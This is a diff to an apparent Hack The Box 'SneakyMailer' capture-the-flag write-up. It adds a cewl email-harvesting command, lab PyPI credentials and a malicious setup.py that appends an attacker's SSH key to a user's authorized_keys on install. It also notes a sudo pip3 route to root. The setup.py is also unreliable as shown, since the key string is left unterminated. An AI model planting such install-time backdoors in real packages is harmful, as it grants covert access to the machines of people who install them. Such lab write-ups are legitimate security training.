@@ -28,6 +28,10 @@ Found few email addresses that we can try sending mail to
 
 #### cewl
 
+```
+cewl -w emails.txt -e -n sneakycorp.htb
+```
+
 - we will use cewl to generate a wordlist of emails
 - got a very big wordlist with other words as well
 - we can use awk to remove unnecessary words
@@ -189,7 +193,83 @@ pypi	:		soufianeelhaoui
 
 
 
-#### pypi server
+## pypi server
 
 ![image-20200813190432007](sneakymailer.assets/image-20200813190432007.png)
 
+
+
+#### elevate shell
+
+- we have pypiserver so we can execute it to create python package which when executed we create authroized key in users directory
+
+**.pypirc**
+
+```python
+[distutils]                                                                                                                                                              
+index-servers = local                                                                                                                                                    
+
+[local]
+repository: http://pypi.sneakycorp.htb:8080
+username: pypi
+password: soufianeelhaoui
+
+```
+
+
+
+**setup.py**
+
+```python
+import setuptools
+
+try:
+    with open("/home/low/.ssh/authorized_keys", "a")as f:
+        f.write("\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDUEZJLy7CYDAg6GIYHfUVUY9vEp/FFM2meK/nSAh6SgZrA0kLOXLA9EaUBksf7FY7xClRtfKHquxpC7ufwOthUjIulKfbbM8gfoRc17phX6NyviYm/nnuDpk2UMxGFdEnhVUIKE60W/ifn7b6KS7ppBDea1BbZEGrsOPLHs27Toy5nc0Arn4n+qN0jSvrfKEgN7Ebphf9FI52C1oy9jwHh0aR4m8JfhezZsDvBUg13BJ1GMnlYe2ijlyJ5H8koMXHT3jYC0/F17r3psG6WZGZ02+NITxpKKwzjPrVm0e7IwLXEBb8PuzF0ga1guENAVeAedb60Jd4CgXMlN7tBfH8IAb2tACEMVV47GFKmCCskwZnSEfkvvYhAFnx9XiVH/6U42jJ1T7ZxGqtNpHFFf+XjwVcYBE2/0Xi1gXZq10ftLEePssEBmZvBVBpDwy82Qt9jS8201qIXjuVQ6Q95twg7kccpXew2m0D8OaUeXObJRxNUea8qj727BH6w3tvY6Ns= )
+        f.close()
+except Exception as e:
+    pass
+
+setuptools.setup(
+    name="example-pkg-YOUR-USERNAME-HERE",  # Replace with your own username
+    version="0.0.1",
+    author="Example Author",
+    author_email="author@example.com",
+    description="A small example package",
+    long_description="long_description",
+    long_description_content_type="text/markdown",
+    url="https://github.com/pypa/sampleproject",
+    packages=setuptools.find_packages(),
+    classifiers=[
+        "Programming Language :: Python :: 3",
+        "License :: OSI Approved :: MIT License",
+        "Operating System :: OS Independent",
+    ],
+)
+```
+
+
+
+- first we download this repository
+- then we change home directory to folder where we saved these 2 files 
+
+```
+python3 setup.py sdist register -r local upload -r local
+```
+
+![image-20200917220356846](sneakymailer.assets/image-20200917220356846.png)
+
+
+
+- we can sign with private key
+
+![image-20200917220435668](sneakymailer.assets/image-20200917220435668.png)
+
+
+
+## root
+
+- we can run pip3 as sudo privileges 
+- we can use gtfo bins to get root privileges in shell
+
+![image-20200917220927921](sneakymailer.assets/image-20200917220927921.png)
